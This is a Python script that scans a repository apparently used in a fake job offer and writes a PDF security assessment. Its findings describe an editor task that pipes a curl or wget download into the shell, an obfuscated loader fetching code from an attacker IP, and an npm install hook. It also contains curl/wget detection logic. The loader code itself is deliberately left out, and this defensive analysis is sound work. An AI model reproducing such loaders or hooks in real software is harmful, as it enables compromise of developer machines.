"""Static-assessment report for the Zyranova archive.

Reads the repository, draws seaborn figures, and writes a PDF.
Does not execute repository code and does not contact remote hosts.
"""

from __future__ import annotations

import hashlib
import os
from collections import Counter

import matplotlib

matplotlib.use("Agg")
import matplotlib.pyplot as plt
import pandas as pd
import seaborn as sns
from PIL import Image as PILImage
from reportlab.lib import colors
from reportlab.lib.enums import TA_CENTER, TA_JUSTIFY, TA_LEFT, TA_RIGHT
from reportlab.lib.pagesizes import letter
from reportlab.lib.styles import ParagraphStyle
from reportlab.lib.units import inch
from reportlab.pdfbase import pdfmetrics
from reportlab.pdfbase.ttfonts import TTFont
from reportlab.platypus import (
    BaseDocTemplate,
    CondPageBreak,
    Frame,
    HRFlowable,
    Image,
    KeepTogether,
    NextPageTemplate,
    PageBreak,
    PageTemplate,
    Paragraph,
    Spacer,
    Table,
    TableStyle,
)

ROOT = r"c:\Users\yalon\Downloads\zyranova-main"
REPO = os.path.join(ROOT, "zyranova-main")
OUT_DIR = os.path.join(ROOT, "security-report")
FIG_DIR = os.path.join(OUT_DIR, "figures")
PDF_PATH = os.path.join(ROOT, "Zyranova_Security_Assessment_Report.pdf")

NAVY = colors.HexColor("#1B2838")
CRIMSON = colors.HexColor("#8E1B2C")
GOLD = colors.HexColor("#A6843D")
INK = colors.HexColor("#1F2933")
MUTED = colors.HexColor("#52606D")
RULE = colors.HexColor("#D9D3C7")
PAPER = colors.HexColor("#F7F4EE")
CODE_BG = colors.HexColor("#F3F0E8")
WHITE = colors.white

SEV_HEX = {
    "Critical": "#8E1B2C",
    "High": "#C4531A",
    "Medium": "#C8963E",
    "Low": "#3E6B8A",
}


def register_fonts() -> None:
    fonts = {
        "Segoe": r"C:\Windows\Fonts\segoeui.ttf",
        "Segoe-Bold": r"C:\Windows\Fonts\segoeuib.ttf",
        "Segoe-Italic": r"C:\Windows\Fonts\segoeuii.ttf",
        "Segoe-BoldItalic": r"C:\Windows\Fonts\segoeuiz.ttf",
        "Consolas": r"C:\Windows\Fonts\consola.ttf",
        "Consolas-Bold": r"C:\Windows\Fonts\consolab.ttf",
    }
    for name, path in fonts.items():
        pdfmetrics.registerFont(TTFont(name, path))
    pdfmetrics.registerFontFamily(
        "Segoe",
        normal="Segoe",
        bold="Segoe-Bold",
        italic="Segoe-Italic",
        boldItalic="Segoe-BoldItalic",
    )


def sha256_file(path: str) -> str:
    digest = hashlib.sha256()
    with open(path, "rb") as handle:
        for chunk in iter(lambda: handle.read(65536), b""):
            digest.update(chunk)
    return digest.hexdigest()


def collect_evidence() -> dict:
    ext = Counter()
    file_count = 0
    for directory, dirnames, filenames in os.walk(REPO):
        dirnames[:] = [name for name in dirnames if name not in {".git", "node_modules"}]
        for filename in filenames:
            file_count += 1
            suffix = os.path.splitext(filename)[1].lower() or "(none)"
            ext[suffix] += 1

    interesting = {
        ".sol": ext.get(".sol", 0),
        ".py": ext.get(".py", 0),
        ".ts": ext.get(".ts", 0),
        ".tsx": ext.get(".tsx", 0),
        ".go": ext.get(".go", 0),
        ".rs": ext.get(".rs", 0),
    }

    def rel(path: str) -> str:
        return os.path.join(REPO, path)

    targets = {
        "tasks": rel(os.path.join(".vscode", "tasks.json")),
        "auth": rel(os.path.join("routes", "api", "auth.js")),
        "package": rel("package.json"),
        "readme": rel("README.md"),
        "login": rel(os.path.join("controllers", "auth.js")),
        "server": rel("server.js"),
        "config": rel("config.js"),
    }
    hashes = {key: sha256_file(path) for key, path in targets.items()}
    sizes = {key: os.path.getsize(path) for key, path in targets.items()}

    auth_lines = open(targets["auth"], encoding="utf-8").read().splitlines()
    line20 = auth_lines[19]
    marker = line20.find("const _")
    export_stmt = "module.exports = router;"
    gap = marker - len(export_stmt)

    task_lines = open(targets["tasks"], encoding="utf-8").read().splitlines()
    hidden_commands = []
    for number, line in enumerate(task_lines, start=1):
        if "curl" in line or "wget" in line:
            hidden_commands.append(
                {
                    "line": number,
                    "length": len(line),
                    "spaces_before_command": line.find('"command"'),
                }
            )

    node_modules = os.path.isdir(os.path.join(REPO, "node_modules"))

    return {
        "file_count": file_count,
        "extensions": ext,
        "absent_languages": interesting,
        "hashes": hashes,
        "sizes": sizes,
        "auth_line_count": len(auth_lines),
        "auth_line20_length": len(line20),
        "auth_gap": gap,
        "hidden_commands": hidden_commands,
        "node_modules": node_modules,
        "tasks_lines": len(task_lines),
    }


FINDINGS = [
    {
        "id": "F-01",
        "title": "Editor task pipes a remote script into the system shell",
        "severity": "Critical",
        "likelihood": 4,
        "impact": 5,
        "category": "Malware execution",
        "component": ".vscode/tasks.json",
    },
    {
        "id": "F-02",
        "title": "Editor task runs npm install as soon as the folder opens",
        "severity": "Critical",
        "likelihood": 4,
        "impact": 5,
        "category": "Supply chain",
        "component": ".vscode/tasks.json",
    },
    {
        "id": "F-03",
        "title": "Hidden loader evaluates JavaScript fetched from a hard-coded host",
        "severity": "Critical",
        "likelihood": 5,
        "impact": 5,
        "category": "Malware execution",
        "component": "routes/api/auth.js",
    },
    {
        "id": "F-04",
        "title": "npm prepare starts the backdoored server during install",
        "severity": "Critical",
        "likelihood": 5,
        "impact": 5,
        "category": "Supply chain",
        "component": "package.json",
    },
    {
        "id": "F-05",
        "title": "Login never checks the password",
        "severity": "High",
        "likelihood": 5,
        "impact": 4,
        "category": "Authentication",
        "component": "controllers/auth.js",
    },
    {
        "id": "F-06",
        "title": "Socket identity and actions are unauthenticated",
        "severity": "High",
        "likelihood": 5,
        "impact": 4,
        "category": "Authentication",
        "component": "socket/index.js",
    },
    {
        "id": "F-07",
        "title": "Chip amounts are taken from the client",
        "severity": "High",
        "likelihood": 5,
        "impact": 3,
        "category": "Game integrity",
        "component": "game/Table.js",
    },
    {
        "id": "F-08",
        "title": "README describes a product this repository is not",
        "severity": "High",
        "likelihood": 5,
        "impact": 4,
        "category": "Social engineering",
        "component": "README.md",
    },
    {
        "id": "F-09",
        "title": "Secret handling, token logging, and browser policy are weak",
        "severity": "Medium",
        "likelihood": 4,
        "impact": 3,
        "category": "Configuration",
        "component": "config and middleware",
    },
    {
        "id": "F-10",
        "title": "Wallet page accepts identity from the URL",
        "severity": "Medium",
        "likelihood": 5,
        "impact": 3,
        "category": "Authentication",
        "component": "ConnectWallet.js",
    },
    {
        "id": "F-11",
        "title": "Chat is relayed without checks",
        "severity": "Medium",
        "likelihood": 5,
        "impact": 2,
        "category": "Abuse",
        "component": "socket/index.js",
    },
    {
        "id": "F-12",
        "title": "Database is never connected and the env path is wrong",
        "severity": "Low",
        "likelihood": 5,
        "impact": 2,
        "category": "Availability",
        "component": "server.js",
    },
]


def apply_chart_style() -> None:
    sns.set_theme(style="whitegrid", context="notebook")
    plt.rcParams.update(
        {
            "font.family": "Segoe UI",
            "axes.titlesize": 13,
            "axes.titleweight": "semibold",
            "axes.labelsize": 10,
            "xtick.labelsize": 8.5,
            "ytick.labelsize": 8.5,
            "figure.facecolor": "white",
            "axes.facecolor": "white",
            "axes.edgecolor": "#D9D3C7",
            "grid.color": "#E6E1D6",
            "text.color": "#1F2933",
            "axes.labelcolor": "#1F2933",
            "xtick.color": "#52606D",
            "ytick.color": "#52606D",
        }
    )


def save_fig(fig: plt.Figure, name: str) -> str:
    path = os.path.join(FIG_DIR, name)
    fig.savefig(path, dpi=170, bbox_inches="tight", facecolor="white")
    plt.close(fig)
    return path


def make_figures(ctx: dict) -> dict:
    os.makedirs(FIG_DIR, exist_ok=True)
    apply_chart_style()
    paths = {}
    frame = pd.DataFrame(FINDINGS)
    severity_order = ["Critical", "High", "Medium", "Low"]
    palette = [SEV_HEX[name] for name in severity_order]

    counts = (
        frame["severity"]
        .value_counts()
        .reindex(severity_order)
        .rename_axis("severity")
        .reset_index(name="count")
    )
    fig, ax = plt.subplots(figsize=(7.4, 3.5))
    sns.barplot(
        data=counts,
        y="severity",
        x="count",
        hue="severity",
        palette=palette,
        legend=False,
        ax=ax,
        orient="h",
    )
    for patch, value in zip(ax.patches, counts["count"]):
        ax.text(
            value + 0.08,
            patch.get_y() + patch.get_height() / 2,
            str(int(value)),
            va="center",
            ha="left",
            fontsize=10,
            color="#1F2933",
            fontweight="semibold",
        )
    ax.set_xlim(0, counts["count"].max() + 1.4)
    ax.set_xlabel("Number of findings")
    ax.set_ylabel("")
    ax.set_title("Findings by severity")
    sns.despine(ax=ax, left=True, bottom=True)
    paths["severity"] = save_fig(fig, "01_severity.png")

    cat_order = (
        frame["category"].value_counts().sort_values(ascending=False).index.tolist()
    )
    cat = (
        frame["category"]
        .value_counts()
        .reindex(cat_order)
        .rename_axis("category")
        .reset_index(name="count")
    )
    fig, ax = plt.subplots(figsize=(7.4, 4.2))
    sns.barplot(
        data=cat,
        y="category",
        x="count",
        color="#1B2838",
        ax=ax,
        orient="h",
    )
    for patch, value in zip(ax.patches, cat["count"]):
        ax.text(
            value + 0.06,
            patch.get_y() + patch.get_height() / 2,
            str(int(value)),
            va="center",
            fontsize=9,
            color="#1F2933",
        )
    ax.set_xlim(0, cat["count"].max() + 1.2)
    ax.set_xlabel("Number of findings")
    ax.set_ylabel("")
    ax.set_title("Findings by category")
    sns.despine(ax=ax, left=True, bottom=True)
    paths["category"] = save_fig(fig, "02_category.png")

    fig, ax = plt.subplots(figsize=(7.5, 5.4))
    sns.scatterplot(
        data=frame,
        x="likelihood",
        y="impact",
        hue="severity",
        hue_order=severity_order,
        palette=SEV_HEX,
        s=160,
        edgecolor="white",
        linewidth=0.8,
        ax=ax,
        zorder=3,
    )
    for _, row in frame.iterrows():
        ax.annotate(
            row["id"],
            (row["likelihood"] + 0.08, row["impact"] + 0.08),
            fontsize=8,
            color="#1F2933",
        )
    ax.set_xlim(3.2, 5.6)
    ax.set_ylim(1.2, 5.6)
    ax.set_xticks([4, 5])
    ax.set_xticklabels(["4  Prompt or default-off trigger", "5  Happens if that code path runs"])
    ax.set_yticks([2, 3, 4, 5])
    ax.set_ylabel("Impact if the finding is reached (1–5)")
    ax.set_xlabel("Likelihood in a normal review of this archive")
    ax.set_title("Likelihood against impact")
    ax.legend(title="Severity", frameon=False, loc="lower left")
    sns.despine(ax=ax)
    paths["risk"] = save_fig(fig, "03_risk_scatter.png")

    heat = pd.DataFrame(
        [
            [5, 4, 4, 5, 5],
            [5, 4, 3, 5, 5],
            [5, 4, 4, 5, 5],
            [5, 4, 3, 4, 5],
            [0, 3, 4, 1, 2],
            [0, 2, 5, 1, 2],
            [0, 1, 5, 1, 1],
            [0, 3, 2, 2, 3],
            [0, 0, 1, 4, 4],
        ],
        index=[
            "tasks.json shell task",
            "tasks.json install task",
            "auth.js loader",
            "package.json prepare",
            "Login handler",
            "Socket handlers",
            "Chip and raise logic",
            "Config and middleware",
            "README lure",
        ],
        columns=[
            "Code execution",
            "Data exposure",
            "Tampering",
            "Concealment",
            "Reach",
        ],
    )
    fig, ax = plt.subplots(figsize=(7.6, 5.2))
    sns.heatmap(
        heat,
        annot=True,
        fmt="d",
        cmap="rocket_r",
        vmin=0,
        vmax=5,
        linewidths=0.6,
        linecolor="white",
        cbar_kws={"label": "Severity of effect (0 = none, 5 = direct)", "shrink": 0.8},
        ax=ax,
    )
    ax.set_title("Effect by component")
    ax.set_xlabel("")
    ax.set_ylabel("")
    plt.setp(ax.get_xticklabels(), rotation=0, ha="center")
    paths["heatmap"] = save_fig(fig, "04_component_heatmap.png")

    claims = pd.DataFrame(
        [
            ("Solidity / Hardhat contracts", "Described in the README", 1),
            ("Solidity / Hardhat contracts", "Present in the archive", 0),
            ("Next.js / Three.js / Babylon", "Described in the README", 1),
            ("Next.js / Three.js / Babylon", "Present in the archive", 0),
            ("PostgreSQL and Redis", "Described in the README", 1),
            ("PostgreSQL and Redis", "Present in the archive", 0),
            ("Python analytics service", "Described in the README", 1),
            ("Python analytics service", "Present in the archive", 0),
            ("Unity / WebGL product layer", "Described in the README", 1),
            ("Unity / WebGL product layer", "Present in the archive", 0),
            ("Polygon NFT transactions", "Described in the README", 1),
            ("Polygon NFT transactions", "Present in the archive", 0),
            ("MIT license and named team", "Described in the README", 1),
            ("MIT license and named team", "Present in the archive", 0),
            ("React poker client", "Described in the README", 1),
            ("React poker client", "Present in the archive", 1),
            ("Express API", "Described in the README", 1),
            ("Express API", "Present in the archive", 1),
            ("MongoDB user model", "Described in the README", 1),
            ("MongoDB user model", "Present in the archive", 1),
            ("Obfuscated remote loader", "Described in the README", 0),
            ("Obfuscated remote loader", "Present in the archive", 1),
            ("Editor remote-shell task", "Described in the README", 0),
            ("Editor remote-shell task", "Present in the archive", 1),
        ],
        columns=["Item", "Source", "Present"],
    )
    fig, ax = plt.subplots(figsize=(7.6, 6.3))
    sns.barplot(
        data=claims,
        y="Item",
        x="Present",
        hue="Source",
        palette={"Described in the README": "#C4B8A5", "Present in the archive": "#1B2838"},
        ax=ax,
    )
    ax.set_xlim(0, 1.35)
    ax.set_xticks([0, 1])
    ax.set_xticklabels(["Absent", "Present"])
    ax.set_xlabel("")
    ax.set_ylabel("")
    ax.set_title("What the README asserts, and what the archive contains")
    ax.legend(frameon=False, loc="lower right")
    sns.despine(ax=ax, left=True, bottom=True)
    paths["claims"] = save_fig(fig, "05_claims_vs_archive.png")

    stage_values = pd.DataFrame(
        [[1, 2, 3, 4], [1, 2, 3, 4], [1, 2, 3, 4]],
        index=["Folder open, install task", "Folder open, shell task", "Manual npm install"],
        columns=["Stage 1", "Stage 2", "Stage 3", "Stage 4"],
    )
    stage_labels = pd.DataFrame(
        [
            ["tasks.json loads", "silent npm install", "prepare starts node", "auth.js fetches code"],
            ["tasks.json loads", "curl or wget runs", "script piped to a shell", "code runs as the user"],
            ["README says install", "prepare script runs", "node server background", "auth.js fetches code"],
        ],
        index=stage_values.index,
        columns=stage_values.columns,
    )
    fig, ax = plt.subplots(figsize=(7.6, 3.6))
    sns.heatmap(
        stage_values,
        annot=stage_labels,
        fmt="",
        cmap="Reds",
        vmin=0.5,
        vmax=4.5,
        linewidths=2,
        linecolor="white",
        cbar=False,
        ax=ax,
    )
    ax.set_title("Three ways the archive reaches remote code")
    ax.set_xlabel("")
    ax.set_ylabel("")
    plt.setp(ax.get_xticklabels(), rotation=0)
    paths["chain"] = save_fig(fig, "06_attack_paths.png")

    controls = pd.DataFrame(
        [
            ("Rate limit on HTTP routes", "Present", 1),
            ("Mongo operator sanitizer", "Present", 1),
            ("HTTP parameter pollution filter", "Present", 1),
            ("Password hashing library imported", "Present", 1),
            ("JWT check on some HTTP routes", "Present", 1),
            ("Password actually compared", "Missing", 0),
            ("Authentication on sockets", "Missing", 0),
            ("Helmet / security headers", "Missing", 0),
            ("CORS restricted to known origins", "Missing", 0),
            ("JWT secret required at startup", "Missing", 0),
            ("Install hook free of code execution", "Missing", 0),
            ("Editor tasks free of shell download", "Missing", 0),
        ],
        columns=["Control", "Status", "Score"],
    )
    fig, ax = plt.subplots(figsize=(7.5, 5.0))
    sns.barplot(
        data=controls,
        y="Control",
        x="Score",
        hue="Status",
        dodge=False,
        palette={"Present": "#2F6F4E", "Missing": "#8E1B2C"},
        ax=ax,
    )
    ax.set_xlim(0, 1.15)
    ax.set_xticks([0, 1])
    ax.set_xticklabels(["Missing", "Present"])
    ax.set_xlabel("")
    ax.set_ylabel("")
    ax.set_title("Defensive controls in the server")
    ax.legend(frameon=False, loc="lower right")
    sns.despine(ax=ax, left=True, bottom=True)
    paths["controls"] = save_fig(fig, "07_controls.png")

    ext = ctx["extensions"]
    top = ext.most_common(12)
    ext_frame = pd.DataFrame(top, columns=["Extension", "Files"])
    fig, ax = plt.subplots(figsize=(7.4, 4.4))
    sns.barplot(data=ext_frame, y="Extension", x="Files", color="#3E6B8A", ax=ax)
    for patch, value in zip(ax.patches, ext_frame["Files"]):
        ax.text(
            value + 0.4,
            patch.get_y() + patch.get_height() / 2,
            str(int(value)),
            va="center",
            fontsize=8,
            color="#1F2933",
        )
    ax.set_xlim(0, ext_frame["Files"].max() + 12)
    ax.set_xlabel("Files in the archive")
    ax.set_ylabel("")
    ax.set_title("What the archive is made of")
    sns.despine(ax=ax, left=True, bottom=True)
    paths["extensions"] = save_fig(fig, "08_extensions.png")
    return paths


def build_styles() -> dict:
    styles = {
        "cover_kicker": ParagraphStyle(
            "cover_kicker",
            fontName="Segoe",
            fontSize=9,
            leading=12,
            textColor=GOLD,
            tracking=1.2,
            alignment=TA_LEFT,
        ),
        "cover_title": ParagraphStyle(
            "cover_title",
            fontName="Segoe-Bold",
            fontSize=26,
            leading=31,
            textColor=WHITE,
            alignment=TA_LEFT,
        ),
        "cover_sub": ParagraphStyle(
            "cover_sub",
            fontName="Segoe",
            fontSize=12,
            leading=17,
            textColor=colors.HexColor("#E6E1D6"),
            alignment=TA_LEFT,
        ),
        "cover_meta": ParagraphStyle(
            "cover_meta",
            fontName="Segoe",
            fontSize=9,
            leading=13,
            textColor=colors.HexColor("#D9D3C7"),
            alignment=TA_LEFT,
        ),
        "H1": ParagraphStyle(
            "H1",
            fontName="Segoe-Bold",
            fontSize=15,
            leading=19,
            textColor=NAVY,
            spaceBefore=8,
            spaceAfter=2,
        ),
        "H2": ParagraphStyle(
            "H2",
            fontName="Segoe-Bold",
            fontSize=12,
            leading=16,
            textColor=colors.HexColor("#3E2C22"),
            spaceBefore=10,
            spaceAfter=4,
        ),
        "H3": ParagraphStyle(
            "H3",
            fontName="Segoe-Bold",
            fontSize=10.5,
            leading=14,
            textColor=INK,
            spaceBefore=8,
            spaceAfter=3,
        ),
        "Body": ParagraphStyle(
            "Body",
            fontName="Segoe",
            fontSize=9.5,
            leading=13.4,
            textColor=INK,
            alignment=TA_JUSTIFY,
            spaceAfter=8,
        ),
        "Bullet": ParagraphStyle(
            "Bullet",
            fontName="Segoe",
            fontSize=9.5,
            leading=13.2,
            textColor=INK,
            leftIndent=14,
            bulletIndent=2,
            spaceAfter=3,
        ),
        "Caption": ParagraphStyle(
            "Caption",
            fontName="Segoe-Italic",
            fontSize=8,
            leading=11,
            textColor=MUTED,
            alignment=TA_LEFT,
            spaceBefore=2,
            spaceAfter=10,
        ),
        "Callout": ParagraphStyle(
            "Callout",
            fontName="Segoe",
            fontSize=9,
            leading=12.6,
            textColor=INK,
            alignment=TA_LEFT,
        ),
        "Th": ParagraphStyle(
            "Th",
            fontName="Segoe-Bold",
            fontSize=8,
            leading=10.5,
            textColor=WHITE,
        ),
        "Td": ParagraphStyle(
            "Td",
            fontName="Segoe",
            fontSize=8,
            leading=10.6,
            textColor=INK,
        ),
        "TdBold": ParagraphStyle(
            "TdBold",
            fontName="Segoe-Bold",
            fontSize=8,
            leading=10.6,
            textColor=INK,
        ),
        "Code": ParagraphStyle(
            "Code",
            fontName="Consolas",
            fontSize=7.6,
            leading=10.2,
            textColor=colors.HexColor("#2C2416"),
        ),
        "Footer": ParagraphStyle(
            "Footer",
            fontName="Segoe",
            fontSize=8,
            leading=10,
            textColor=MUTED,
        ),
        "Small": ParagraphStyle(
            "Small",
            fontName="Segoe",
            fontSize=8,
            leading=10.8,
            textColor=INK,
            alignment=TA_LEFT,
            spaceAfter=4,
        ),
        "CenterSmall": ParagraphStyle(
            "CenterSmall",
            fontName="Segoe",
            fontSize=8.5,
            leading=11,
            textColor=MUTED,
            alignment=TA_CENTER,
        ),
    }
    return styles


S = {}


def esc(value: str) -> str:
    return (
        value.replace("&", "&amp;")
        .replace("<", "&lt;")
        .replace(">", "&gt;")
    )


def P(text: str, style: str = "Body"):
    return Paragraph(text, S[style])


def bullets(items: list[str]) -> list:
    return [Paragraph("•  " + item, S["Bullet"]) for item in items]


def h1(text: str):
    return Paragraph(text, S["H1"])


def h2(text: str):
    return Paragraph(text, S["H2"])


def h3(text: str):
    return Paragraph(text, S["H3"])


def rule():
    return HRFlowable(width="100%", thickness=1.25, color=CRIMSON, spaceBefore=0, spaceAfter=8)


def caption(text: str):
    return Paragraph(text, S["Caption"])


def callout(text: str, border=CRIMSON, bg="#F8F1F1"):
    table = Table([[Paragraph(text, S["Callout"])]], colWidths=[7.05 * inch])
    table.setStyle(
        TableStyle(
            [
                ("BACKGROUND", (0, 0), (-1, -1), colors.HexColor(bg)),
                ("LINEBEFORE", (0, 0), (0, -1), 4, border),
                ("LEFTPADDING", (0, 0), (-1, -1), 10),
                ("RIGHTPADDING", (0, 0), (-1, -1), 8),
                ("TOPPADDING", (0, 0), (-1, -1), 7),
                ("BOTTOMPADDING", (0, 0), (-1, -1), 7),
                ("VALIGN", (0, 0), (-1, -1), "TOP"),
            ]
        )
    )
    table.spaceAfter = 10
    return table


def code_block(text: str):
    table = Table([[Paragraph(esc(text), S["Code"])]], colWidths=[7.05 * inch])
    table.setStyle(
        TableStyle(
            [
                ("BACKGROUND", (0, 0), (-1, -1), CODE_BG),
                ("BOX", (0, 0), (-1, -1), 0.4, colors.HexColor("#D4CBBA")),
                ("LEFTPADDING", (0, 0), (-1, -1), 8),
                ("RIGHTPADDING", (0, 0), (-1, -1), 8),
                ("TOPPADDING", (0, 0), (-1, -1), 6),
                ("BOTTOMPADDING", (0, 0), (-1, -1), 6),
            ]
        )
    )
    table.spaceAfter = 8
    return table


def flow_image(path: str, max_width: float = 7.05 * inch, max_height: float = 8.3 * inch):
    with PILImage.open(path) as image:
        width_px, height_px = image.size
    aspect = height_px / float(width_px)
    width = max_width
    height = width * aspect
    if height > max_height:
        height = max_height
        width = height / aspect
    picture = Image(path, width=width, height=height)
    picture.spaceBefore = 2
    picture.spaceAfter = 2
    return picture


def styled_table(headers: list[str], rows: list[list[str]], col_widths: list[float]):
    head = [Paragraph(esc(cell), S["Th"]) for cell in headers]
    body = []
    for row in rows:
        body.append([Paragraph(cell, S["Td"]) for cell in row])
    table = Table([head] + body, colWidths=col_widths, repeatRows=1)
    style_cmds = [
        ("BACKGROUND", (0, 0), (-1, 0), NAVY),
        ("TEXTCOLOR", (0, 0), (-1, 0), WHITE),
        ("FONTNAME", (0, 0), (-1, 0), "Segoe-Bold"),
        ("BACKGROUND", (0, 1), (-1, -1), colors.HexColor("#FBF9F5")),
        ("ROWBACKGROUNDS", (0, 1), (-1, -1), [colors.HexColor("#FBF9F5"), colors.HexColor("#F3F0E8")]),
        ("VALIGN", (0, 0), (-1, -1), "TOP"),
        ("LEFTPADDING", (0, 0), (-1, -1), 5),
        ("RIGHTPADDING", (0, 0), (-1, -1), 5),
        ("TOPPADDING", (0, 0), (-1, -1), 4),
        ("BOTTOMPADDING", (0, 0), (-1, -1), 4),
        ("GRID", (0, 0), (-1, -1), 0.3, colors.HexColor("#E4DDD0")),
        ("LINEBELOW", (0, 0), (-1, 0), 1.5, CRIMSON),
    ]
    table.setStyle(TableStyle(style_cmds))
    table.spaceAfter = 10
    return table


def finding_banner(row: dict):
    sev = row["severity"]
    color = colors.HexColor(SEV_HEX[sev])
    left = Paragraph(f"<b>{row['id']}</b>", ParagraphStyle("fid", parent=S["Th"], fontSize=11, leading=13))
    mid = Paragraph(esc(row["title"]), ParagraphStyle("ftitle", parent=S["TdBold"], fontSize=9, leading=12, textColor=WHITE))
    right = Paragraph(sev, ParagraphStyle("fsev", parent=S["Th"], alignment=TA_CENTER, fontSize=8))
    table = Table([[left, mid, right]], colWidths=[0.7 * inch, 5.15 * inch, 1.2 * inch])
    table.setStyle(
        TableStyle(
            [
                ("BACKGROUND", (0, 0), (-1, -1), color),
                ("TEXTCOLOR", (0, 0), (-1, -1), WHITE),
                ("VALIGN", (0, 0), (-1, -1), "MIDDLE"),
                ("LEFTPADDING", (0, 0), (-1, -1), 6),
                ("RIGHTPADDING", (0, 0), (-1, -1), 6),
                ("TOPPADDING", (0, 0), (-1, -1), 6),
                ("BOTTOMPADDING", (0, 0), (-1, -1), 6),
            ]
        )
    )
    meta = Paragraph(
        f"<b>Component.</b> {esc(row['component'])} &nbsp;&nbsp; <b>Category.</b> {esc(row['category'])} &nbsp;&nbsp; "
        f"<b>Likelihood.</b> {row['likelihood']} / 5 &nbsp;&nbsp; <b>Impact.</b> {row['impact']} / 5",
        S["Small"],
    )
    block = KeepTogether([Spacer(1, 6), table, Spacer(1, 4), meta])
    return block


class ReportDoc(BaseDocTemplate):
    def __init__(self, filename: str, **kwargs):
        super().__init__(filename, **kwargs)
        self.bookmark_index = 0

    def afterFlowable(self, flowable):
        if isinstance(flowable, Paragraph) and flowable.style.name in {"H1", "H2"}:
            text = flowable.getPlainText()
            key = f"bm{self.bookmark_index}"
            self.bookmark_index += 1
            self.canv.bookmarkPage(key)
            level = 0 if flowable.style.name == "H1" else 1
            self.canv.addOutlineEntry(text, key, level=level, closed=False)


def draw_cover(canvas, doc):
    canvas.saveState()
    width, height = letter
    canvas.setFillColor(NAVY)
    canvas.rect(0, 0, width, height, fill=1, stroke=0)
    canvas.setFillColor(CRIMSON)
    canvas.rect(0, height - 14, width, 14, fill=1, stroke=0)
    canvas.setFillColor(GOLD)
    canvas.rect(0, 0, width, 10, fill=1, stroke=0)
    canvas.setFillColor(colors.HexColor("#243447"))
    canvas.rect(0, 78, width, 118, fill=1, stroke=0)
    canvas.restoreState()


def draw_body(canvas, doc):
    canvas.saveState()
    width, height = letter
    canvas.setFillColor(NAVY)
    canvas.rect(0, height - 32, width, 32, fill=1, stroke=0)
    canvas.setFillColor(CRIMSON)
    canvas.rect(0, height - 36, width, 4, fill=1, stroke=0)
    canvas.setFillColor(WHITE)
    canvas.setFont("Segoe", 8)
    canvas.drawString(0.72 * inch, height - 20, "Zyranova archive  ·  malware and security assessment")
    canvas.setFont("Segoe", 8)
    canvas.drawRightString(width - 0.72 * inch, height - 20, "Confidential")
    canvas.setFillColor(NAVY)
    canvas.rect(0, 0, width, 30, fill=1, stroke=0)
    canvas.setFillColor(GOLD)
    canvas.rect(0, 30, width, 3, fill=1, stroke=0)
    canvas.setFillColor(colors.HexColor("#E6E1D6"))
    canvas.setFont("Segoe", 8)
    canvas.drawString(0.72 * inch, 12, "Static review only. The assessed code was not executed.")
    canvas.drawRightString(width - 0.72 * inch, 12, f"Page {doc.page}")
    canvas.restoreState()


def story_for(ctx: dict, figures: dict) -> list:
    gap_cmd = ctx["hidden_commands"]
    gap_note = ", ".join(
        f"line {item['line']} is {item['length']} characters with the command starting at column {item['spaces_before_command'] + 1}"
        for item in gap_cmd
    )
    ext = ctx["extensions"]
    zero_langs = ", ".join(f"{name} = {count}" for name, count in ctx["absent_languages"].items())

    story: list = []
    story.append(Spacer(1, 2.15 * inch))
    story.append(Paragraph("SECURITY ASSESSMENT", S["cover_kicker"]))
    story.append(Spacer(1, 10))
    story.append(Paragraph("Zyranova archive", S["cover_title"]))
    story.append(Spacer(1, 8))
    story.append(
        Paragraph(
            "Malware loaders, a fabricated Web3 product description, and the application defects underneath them.",
            S["cover_sub"],
        )
    )
    story.append(Spacer(1, 16))
    story.append(
        Paragraph(
            "Assessment date &nbsp;&nbsp; 21 November 2026<br/>Subject &nbsp;&nbsp; Local folder zyranova-main<br/>Method &nbsp;&nbsp; Static review and offline decode. No execution. No contact with remote hosts.<br/>Distribution &nbsp;&nbsp; The person who asked for this review.",
            S["cover_meta"],
        )
    )
    story.append(NextPageTemplate("body"))
    story.append(PageBreak())

    story += [
        h1("1.  How to use this report"),
        rule(),
        callout(
            "<b>Do not run this project.</b> Do not run npm install, npm start, or the editor tasks, and do not approve automatic tasks if an editor asks. Opening the folder is enough for the malicious editor file to be eligible to run. Installing dependencies is enough for the hidden loader to start."
        ),
        P(
            "This report records a static review of a local archive presented as a decentralized metaverse and blockchain product. The review was requested because the archive arrived in a context associated with a fake job offer. The question was whether the code contains intentional weaknesses, malware, or other software defects."
        ),
        P(
            "It contains all three. Two independent mechanisms download code from an attacker-controlled location and run it. A third mechanism, the package install hook, starts the Node process that activates the second mechanism. The product description in the README does not match the code. Under that description sits a poker application with several defects that look placed for a security-review exercise. Those defects are real. They are not what puts a workstation at risk. The loaders are."
        ),
        P(
            "The encoded blob and the steps that would cause it to run are omitted on purpose. Indicators that a defender needs — host names, the script locations, file hashes, and the behavior recovered by decoding — are included. The second-stage program was not downloaded. Its contents are unknown, and this report does not guess at a feature list for code that was not observed."
        ),
        h2("Contents"),
        P("The PDF outline lists the same sections.", "Small"),
    ]
    for item in [
        "2. Document control and bottom line",
        "3. Scope, method, and limits",
        "4. What the archive claims to be",
        "5. How the loaders are reached",
        "6. Malware findings F-01 through F-04",
        "7. Application defects F-05 through F-12",
        "8. Reading the charts",
        "9. Indicators",
        "10. What to do",
        "11. Evidence appendix",
    ]:
        story.append(Paragraph(item, S["Bullet"]))
    story.append(Spacer(1, 8))

    story += [
        h1("2.  Document control and bottom line"),
        rule(),
    ]
    story.append(
        styled_table(
            ["Field", "Value"],
            [
                ["Report title", "Zyranova archive — malware and security assessment"],
                ["Assessment date", "21 November 2026"],
                ["Archive location", esc(REPO)],
                ["Files walked", f"{ctx['file_count']} files, excluding .git and node_modules"],
                ["node_modules present", "No" if not ctx["node_modules"] else "Yes"],
                ["Code executed", "No"],
                ["Attacker hosts contacted", "No"],
                ["Second stage retrieved", "No"],
                ["Classification", "Confidential. Malware is described so it can be contained."],
            ],
            [1.7 * inch, 5.35 * inch],
        )
    )
    story.append(
        callout(
            "<b>Bottom line.</b> Treat the archive as hostile. A silent editor task downloads a script and feeds it to the shell. A second silent editor task runs npm install. The install hook starts the Node server, and loading the authentication router evaluates JavaScript fetched from 88.216.57.122 on port 8080. If either path has already run, treat that computer as compromised.",
            border=CRIMSON,
            bg="#F8F1F1",
        )
    )
    story.append(P(
        "Four findings are critical, and all four are part of that execution chain. Four more are high: a password check that does not check the password, sockets that trust the client, chip amounts taken from the client, and a README that invents a company, a stack, and a team. The remaining findings are medium or low defects in an application that does not boot a database and does not match its own documentation. No Solidity, no Hardhat project, no NFT marketplace, and no in-repository transaction that would drain a wallet were present."
    ))
